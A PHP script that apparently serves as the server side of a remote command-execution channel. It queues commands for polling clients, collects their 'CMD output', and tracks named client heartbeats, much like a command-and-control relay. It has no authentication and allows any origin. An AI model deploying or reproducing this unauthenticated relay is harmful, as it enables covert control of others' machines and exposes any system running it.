<?php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if($_SERVER['REQUEST_METHOD']=="OPTIONS")
{
    exit;
}


$commandFile="commands.json";
$outputFile="outputs.json";
$statusFile="status.json";


$action=$_GET["action"]??"";


function loadJson($file)
{
    if(!file_exists($file))
        return [];

    $data=json_decode(file_get_contents($file),true);

    if(!is_array($data))
        return [];

    return $data;
}


function saveJson($file,$data)
{
    file_put_contents(
        $file,
        json_encode(
            $data,
            JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
        ),
        LOCK_EX
    );
}


// frontend/backend sends command
if($action=="send")
{
    $msg=file_get_contents("php://input");


    if(empty($msg))
    {
        echo "ERROR_EMPTY";
        exit;
    }


    $commands=loadJson($commandFile);

    $commands[]=$msg;

    saveJson($commandFile,$commands);


    echo "OK";
    exit;
}


// backend reads command
if($action=="latest")
{
    $commands=loadJson($commandFile);


    if(count($commands)>0)
    {
        echo end($commands);

        // remove executed command
        array_pop($commands);
        saveJson($commandFile,$commands);
    }

    exit;
}


// backend sends CMD output
if($action=="output")
{
    $msg=file_get_contents("php://input");


    if(empty($msg))
    {
        echo "ERROR_EMPTY";
        exit;
    }


    $outputs=loadJson($outputFile);

    $outputs[]=$msg;

    saveJson($outputFile,$outputs);


    echo "OK";
    exit;
}


// frontend reads CMD output
if($action=="get")
{
    echo json_encode(
        loadJson($outputFile),
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
    );

    exit;
}


// clear logs
if($action=="clear")
{
    saveJson($outputFile,[]);

    echo "CLEARED";

    exit;
}


if($action=="status")
{
    $name=$_GET["name"]??"unknown";

    $status=loadJson($statusFile);

    $status[$name]=time();

    saveJson($statusFile,$status);

    echo "OK";
    exit;
}


if($action=="check")
{
    echo json_encode(
        loadJson($statusFile)
    );

    exit;
}


echo "INVALID_ACTION";

?>
